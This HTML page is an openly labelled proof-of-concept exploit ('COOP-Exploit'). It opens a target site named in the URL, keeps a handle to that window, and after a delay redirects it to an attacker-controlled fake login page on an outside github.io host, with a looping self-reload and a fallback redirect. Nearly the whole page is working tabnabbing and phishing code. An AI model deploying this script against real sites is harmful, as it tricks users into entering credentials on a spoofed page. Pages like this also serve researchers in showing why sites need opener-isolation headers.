<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Redirecting...</title>
    <style>
        body {
            background-color: white;
            width: 100%;
            height: 100vh;
            margin: 0;
            display: flex;
            justify-content: center;
            align-items: center;
            text-align: center;
            font-family: Arial, sans-serif;
        }
        #message {
            color: black;
            font-size: 20px;
            max-width: 80%;
            padding: 20px;
            border: 1px solid #ccc;
            border-radius: 10px;
            box-shadow: 0px 0px 10px rgba(0, 0, 0, 0.1);
            background-color: #f9f9f9;
        }
    </style>
    <script type="text/javascript">
        function tParam(qParam) {
            const frmURL = window.location.search.substring(1);
            const varURL = frmURL.split('&');
            for (let i = 0; i < varURL.length; i++) {
                const vParam = varURL[i].split('=');
                if (vParam[0] === qParam) {
                    return decodeURIComponent(vParam[1]);
                }
            }
            window.location.href = "https://sp3ttr0.github.io/COOP-Exploit/";
        }

        function init() {
            console.log("Redirecting to attacker's controlled site");
            foo.location.href = "https://sp3ttr0.github.io/COOP-Exploit/login.html";
        }

        function launch() {
            const target = tParam("target");
            foo = window.open(target, "foo", "");
            console.log("Target site opened successfully");
            setTimeout(init, 6000);
        }

        function setup() {
            const target = tParam("target");
            document.body.addEventListener('click', launch);
            const message = document.getElementById('message');
            message.innerText = `If the site did not automatically redirect to ${target}, click anywhere in the white background.`;
            launch();
        }

        window.onload = function () {
            setup();
            setTimeout(() => {
                location.reload();
            }, 5000);
        };
    </script>
</head>
<body>
    <div id="message">If the site did not automatically redirect, click anywhere in the white background.</div>
</body>
</html>
